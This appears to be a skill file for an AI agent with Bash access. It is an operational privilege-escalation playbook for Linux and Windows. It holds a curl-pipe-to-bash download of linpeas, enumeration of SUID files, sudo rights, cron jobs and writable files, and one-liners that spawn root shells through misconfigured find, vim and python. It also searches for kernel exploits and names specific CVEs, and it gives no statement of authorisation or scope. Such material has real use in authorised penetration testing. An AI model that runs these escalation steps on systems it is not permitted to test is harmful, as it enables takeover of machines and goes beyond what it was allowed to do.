---
name: system
description: Local privilege escalation — SUID, sudo misconfig, cron, PATH injection, kernel exploits
allowed-tools: [Bash, Read, Write]
---

# System / Privilege Escalation

Escalate from initial access to root/SYSTEM. Covers Linux and Windows.

## Tools

| Tool | Purpose |
|------|---------|
| linpeas | Linux privilege escalation enumeration |
| winpeas | Windows privilege escalation enumeration |
| pspy | Monitor Linux processes without root |
| linenum | Alternative Linux enumeration |
| searchsploit | Exploit database search |
| GTFOBins | SUID/sudo binary exploitation reference |

## Linux Enumeration

```bash
# Automated
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash \
  > OUTPUT_DIR/logs/linpeas.txt 2>&1

# Or from local copy
bash /usr/share/peass/linpeas/linpeas.sh > OUTPUT_DIR/logs/linpeas.txt 2>&1

# Manual checks
sudo -l 2>/dev/null | tee OUTPUT_DIR/logs/sudo-l.txt
find / -perm -4000 -type f 2>/dev/null | tee OUTPUT_DIR/logs/suid-files.txt
find / -perm -2000 -type f 2>/dev/null | tee OUTPUT_DIR/logs/sgid-files.txt
cat /etc/crontab; ls -la /etc/cron* 2>/dev/null | tee OUTPUT_DIR/logs/crontabs.txt
find / -writable -type f -not -path "*/proc/*" 2>/dev/null | tee OUTPUT_DIR/logs/writable-files.txt
uname -a; cat /etc/os-release | tee OUTPUT_DIR/logs/kernel-info.txt
```

## SUID Exploitation

```bash
# Check found SUID binaries against GTFOBins
while read suid; do
  binary=$(basename "$suid")
  echo "=== $binary ($suid) ==="
  # Check: https://gtfobins.github.io/#+suid
done < OUTPUT_DIR/logs/suid-files.txt

# Common exploitable SUIDs:
# find: find . -exec /bin/sh -p \; -quit
# vim: vim -c ':py3 import os; os.execl("/bin/sh","sh","-p")'
# python: python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# bash (if SUID): bash -p
```

## Sudo Misconfigurations

```bash
# ALL = root without password
# (ALL) NOPASSWD: /usr/bin/vim → vim -c '!/bin/bash'
# (ALL) NOPASSWD: /usr/bin/python3 → python3 -c 'import os; os.system("/bin/bash")'
# (root) NOPASSWD: /usr/bin/find → find . -exec /bin/sh \;

# Check sudo version for CVE-2021-3156 (Baron Samedit)
sudo --version | head -1
```

## Cron Job Exploitation

```bash
# Monitor cron with pspy
pspy64 | tee OUTPUT_DIR/logs/pspy.txt &  # run for 2-3 minutes

# Look for writable scripts run by cron as root
cat OUTPUT_DIR/logs/crontabs.txt | grep root
find /etc/cron* /var/spool/cron -writable 2>/dev/null
```

## Kernel Exploits

```bash
uname -r   # kernel version
searchsploit linux kernel $(uname -r | cut -d. -f1,2) | tee OUTPUT_DIR/logs/kernel-searchsploit.txt

# Common: CVE-2021-4034 (pkexec), CVE-2022-0847 (Dirty Pipe), CVE-2021-3156 (sudo)
```

## Windows (WinPEAS)

```powershell
# Download and run
.\winPEASany.exe > C:\Temp\winpeas.txt

# Manual checks
whoami /priv
whoami /groups  
net localgroup administrators
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
wmic service get name,startname,pathname | findstr /iv "c:\windows"
```

## Output

Findings → `OUTPUT_DIR/findings/finding-NNN/`
Evidence: shell screenshot showing UID=0 or SYSTEM level access
